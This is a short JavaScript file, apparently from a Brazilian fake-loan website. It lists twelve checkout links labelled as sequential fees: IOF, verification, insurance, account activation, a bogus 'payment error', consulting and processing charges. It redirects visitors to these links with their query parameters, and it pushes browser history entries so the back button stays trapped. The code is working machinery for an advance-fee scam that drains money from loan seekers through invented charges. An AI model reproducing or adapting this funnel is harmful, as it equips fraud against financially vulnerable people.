const baseLinks = {
    up1: "https://pay.transacaoseguraemprestimo.online/c/050298f3-cd55-4308-acc7-3a386f574df9", // IOF
    up2: "https://pay.transacaoseguraemprestimo.online/c/2f4d6744-832b-4d65-bb4b-bc24c6a4ab78", // Taxa de verificação de IOF
    up3: "https://pay.transacaoseguraemprestimo.online/c/49ea409a-2319-46cc-a2d6-0c4079cf0167", // Seguro Prestamista "tarifa de cadastro"
    up4: "https://pay.transacaoseguraemprestimo.online/c/c6c48786-e863-442a-80de-4fa64d27d2e1", // NFe
    up5: "https://pay.transacaoseguraemprestimo.online/c/3dfba64d-8a86-4e14-85b8-3c22c94c2453", // Ativar conta
    up6: "https://pay.transacaoseguraemprestimo.online/c/e941d810-5dfe-4d45-84f5-60646eb4160d", // Taxa de registro do contrato
    up7: "https://pay.transacaoseguraemprestimo.online/c/fe8a4df8-2fb0-42d7-bba1-d9fd476f96f5", // Parabéns, 20k adicional
    up8: "https://pay.transacaoseguraemprestimo.online/c/3372a1d5-6e25-4ac4-b4b5-182257b3e5f8", // Erro no pagamento - 14,06
    up9: "https://pay.transacaoseguraemprestimo.online/c/11c64dd7-2838-44f9-ac22-9a040c5b09b1", // APP - 11,99
    up10:"https://pay.transacaoseguraemprestimo.online/c/57c17a6b-c13e-43f0-8e1d-bf76fe79f3b0", // Taxa de Abertura TAC - 16,92
    up11:"https://pay.transacaoseguraemprestimo.online/c/201ae9c9-8cfe-472a-89c1-d5630a3c3d68", // Taxa de Consultoria Financeira - 19,53
    up12:"https://pay.paguefinal.space/c/b0169469-cebc-43af-8ef4-076055e8b716" // Taxa de Processamento Administrativo - 31,92

};

function redirect(key) {
    try {
        if (!baseLinks[key]) {
            throw new Error(`Link para ${key} não encontrado!`);
        }

        const url = new URL(baseLinks[key]);
        url.search = new URLSearchParams(window.location.search).toString();

        window.location.href = url.href;
        
    } catch (error) {
        console.error('Erro no redirecionamento:', error);
        alert(`Erro: ${error.message || "Não foi possível redirecionar"}`);
    }
}

// Adiciona duas entradas no histórico para capturar a navegação para trás
history.pushState({}, '', location.href);
history.pushState({}, '', location.href);

